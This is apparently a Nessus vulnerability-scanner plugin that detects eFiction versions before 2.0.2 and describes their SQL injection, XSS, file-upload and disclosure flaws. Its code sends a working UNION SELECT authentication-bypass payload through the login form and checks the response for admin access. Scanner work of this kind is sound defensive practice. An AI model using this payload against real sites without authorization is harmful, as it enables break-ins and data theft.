#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20349);
  script_version("$Revision: 1.25 $");

  script_cve_id(
    "CVE-2005-4167",
    "CVE-2005-4168",
    "CVE-2005-4169",
    "CVE-2005-4170",
    "CVE-2005-4171",
    "CVE-2005-4172",
    "CVE-2005-4173",
    "CVE-2005-4174"
  );
  script_bugtraq_id(15568);
  script_osvdb_id(
    21118,
    21119,
    21120,
    21121,
    21122,
    21123,
    21124,
    21125,
    21126,
    48707
  );

  script_name(english:"eFiction < 2.0.2 Multiple Remote Vulnerabilities (SQLi, XSS, Disc)");
  script_summary(english:"Checks for multiple vulnerabilities in eFiction < 2.0.2");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running eFiction, an open source application in PHP
for writers. 

The installed version of eFiction is affected by numerous flaws :

  - Members may be able to upload files containing arbitrary  
    PHP code disguised as image files and then run that code 
    on the remote host subject to the privileges of the web 
    server user id. If an attacker does not yet have access,
    he can register and have a password mailed to him 
    automatically.

  - User-supplied input to several parameters and scripts is 
    used without sanitation, which can lead to SQL injection
    attacks provided PHP's 'magic_quotes_gpc' is disabled.
    These issues can be exploited, for example, to bypass
    authentication or disclose sensitive information.

  - User-supplied input to the 'let' parameter of the 
    'titles.php' script is not sanitized before being used
    in dynamically-generated web pages, which leads to 
    cross-site scripting attacks.

  - An unauthenticated attacker may be able to gain
    information about the installation and configuration of
    PHP on the remote host by requesting the 'phpinfo.php'
    script or to learn the install path by a direct request
    to the 'storyblock.php' script with no arguments.

  - Unauthenticated attackers may be able to access the 
    'install.php' and/or 'upgrade.php' scripts and thereby
    modify the installation on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/efiction2_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Nov/302" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to eFiction 2.0.2 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/25");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:efiction_project:efiction");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

init_cookiejar();

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/efiction", "/eFiction", "/fanfiction", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the user.php script exists.
  r = http_send_recv3(method: 'GET', item:string(dir, "/user.php"), port:port);
  if (isnull(r)) exit(0);

  # If it does and looks like eFiction...
  if (
    '<form method="POST"' >< r[2] &&
    egrep(pattern:'<INPUT .*name="penname"', string:r[2]) &&
    egrep(pattern:'<INPUT type="password" .*name="password"', string:r[2])
  ) {
    # Determine how to exploit the flaw.
    basic_exploit = string("'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e','", SCRIPT_NAME, "',0,'',1,'me@example.com'");
    # - eFiction 2.0
    if ('<li ><a href="search.php?action=recent">' >< r[2]) {
      ver = "2.0";
      exploit = string(basic_exploit, ",'',''--");
    }
    # - eFiction 1.1
    else if ('&nbsp;<a class="menu" href="search.php?action=recent">' >< r[2]) {
      ver = "1.1";
      exploit = string(basic_exploit, ",''--");
    }
    # - eFiction 1.0 (both bluepurple and zelda skins).
    else if ('| <a class="menu" href="search.php?action=recent"' >< r[2]) {
      ver = "1.0"; 
      exploit = string(basic_exploit, "--");
    }
    else {
      ver = NULL;
      exploit = NULL;
    }

    # Try to exploit the flaw if we know how to.
    if (!isnull(exploit)) {
      postdata = string(
        "penname=", exploit, "&",
        "password=&",
        "submit=submit"
      );
      r = http_send_recv3(method: 'POST', item: dir, version: 11, 
      	data: postdata, follow_redirect: 0, port: port,
add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # There's a problem if...
      if (
        # we're logged in directly or...
        '<a href="admin.php">Admin</a>' >< r[2] ||
        # we're redirected to user.php with a session cookie.
        (
          "Location: user.php" >< r[1] &&
          "Set-Cookie: PHPSESSID=" >< r[1]
        ) ||
        # we couldn't log in because magic_quotes was enabled but we're 
        # running an older version that might suffer from other flaws.
        # 
        # nb: the fix doesn't even try to check the username / password combo.
        '<a href="user.php?action=lostpassword">' >< r[2]
      ) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
